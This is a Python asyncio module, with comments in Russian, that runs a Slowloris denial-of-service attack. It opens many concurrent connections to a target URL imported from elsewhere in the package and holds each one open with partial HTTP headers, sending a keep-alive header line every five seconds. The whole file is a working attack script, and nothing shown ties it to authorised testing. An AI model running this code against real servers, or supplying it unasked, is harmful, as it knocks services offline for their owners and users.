import asyncio
from urllib.parse import urlparse
from . import TARGET_URL

async def slow_connection(host: str, port: int, path: str, duration: int):
    try:
        reader, writer = await asyncio.open_connection(host, port)
        
        # Отправляем заголовки по кусочкам
        writer.write(f"GET {path} HTTP/1.1\r\n".encode())
        writer.write(f"Host: {host}\r\n".encode())
        writer.write(b"User-Agent: Slowloris\r\n")
        await writer.drain()
        
        # Долго висим, иногда отправляя пробелы (чтобы сервер не закрыл по таймауту)
        import time
        end_time = time.time() + duration
        while time.time() < end_time:
            writer.write(b"X-Keep-Alive: 1\r\n")
            await writer.drain()
            await asyncio.sleep(5)
            
        writer.write(b"\r\n")
        await writer.drain()
        writer.close()
        await writer.wait_closed()
    except Exception:
        pass

async def run_slowloris(duration: int = 30, connections: int = 100):
    """Запускает Slowloris-атаку."""
    print(f"🐢 Starting Slowloris for {duration}s with {connections} connections...")
    
    parsed = urlparse(TARGET_URL)
    host = parsed.hostname
    port = parsed.port or 80
    
    tasks = [
        asyncio.create_task(slow_connection(host, port, "/", duration))
        for _ in range(connections)
    ]
    
    await asyncio.gather(*tasks, return_exceptions=True)
    print("✅ Slowloris finished.")